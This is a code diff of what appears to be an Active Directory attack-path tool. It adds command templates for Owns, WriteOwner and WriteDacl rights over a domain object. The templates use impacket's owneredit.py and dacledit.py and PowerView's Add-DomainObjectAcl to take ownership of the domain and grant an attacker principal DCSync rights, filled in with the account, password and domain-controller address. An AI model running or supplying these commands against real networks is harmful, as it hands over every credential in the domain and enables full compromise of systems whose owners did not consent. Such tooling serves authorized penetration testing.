@@ -18,6 +18,10 @@ class CommandSet:
         return bool(self.commands)
 
 
+def _fqdn_to_dn(fqdn: str) -> str:
+    return ",".join(f"DC={part}" for part in fqdn.split("."))
+
+
 def _parse(label: str) -> dict:
     """Extract short name, domain, and FQDN from a display name."""
     label = (label or "").strip()
@@ -238,6 +242,15 @@ def get_commands(
             ), na
 
         case "Owns" | "WriteOwner":
+            if dst_kind == "domains":
+                dn = _fqdn_to_dn(TF)
+                return CommandSet(
+                    f"Take ownership of {TF}, then grant DCSync rights.",
+                    [
+                        f"owneredit.py -action write -new-owner '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
+                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
+                    ],
+                ), na
             return CommandSet(
                 f"Take ownership of {TF}, then grant yourself FullControl.",
                 [
@@ -247,6 +260,16 @@ def get_commands(
             ), na
 
         case "WriteDacl":
+            if dst_kind == "domains":
+                dn = _fqdn_to_dn(TF)
+                return CommandSet(
+                    f"Modify DACL on {TF} — grant DCSync rights.",
+                    [
+                        f"dacledit.py -action write -rights DCSync -principal '{A}' -target-dn '{dn}' '{D}/{A}:{PASS}' -dc-ip {DC}",
+                        f"# PowerView:",
+                        f"Add-DomainObjectAcl -TargetIdentity '{T}' -PrincipalIdentity '{A}' -Rights DCSync -Credential $Cred",
+                    ],
+                ), na
             return CommandSet(
                 f"Modify DACL on {TF} — grant yourself FullControl.",
                 [
